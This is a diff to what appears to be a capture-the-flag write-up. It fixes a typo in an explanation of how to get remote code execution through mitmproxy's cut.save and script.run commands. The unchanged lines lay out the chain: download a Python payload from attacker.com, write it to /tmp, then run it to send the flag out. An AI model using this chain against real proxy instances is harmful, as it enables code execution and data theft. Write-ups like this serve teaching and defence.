@@ -32,7 +32,7 @@ There is no detailed documentation on cuts, but from the [source code](https://g
 Using this, we can achieve RCE in the following steps:
 
 1. Send a request through the proxy to `http://attacker.com/pwn.py`. The response contains Python code that sends the flag to the attacker’s server.
-2. Run the cut.save command with flows=`~d attacker.com`, cut=r`esponse.txt`, and path=`/tmp/pwn.py`. If the flow result is a single item, the response body from step 1 is written directly to `/tmp/pwn.py`.
+2. Run the cut.save command with flows=`~d attacker.com`, cut=`response.txt`, and path=`/tmp/pwn.py`. If the flow result is a single item, the response body from step 1 is written directly to `/tmp/pwn.py`.
 3. Run `script.run` with `/tmp/pwn.py` to execute the Python code, which exfiltrates the flag to the attacker’s server.
 
 ### Unintended solution
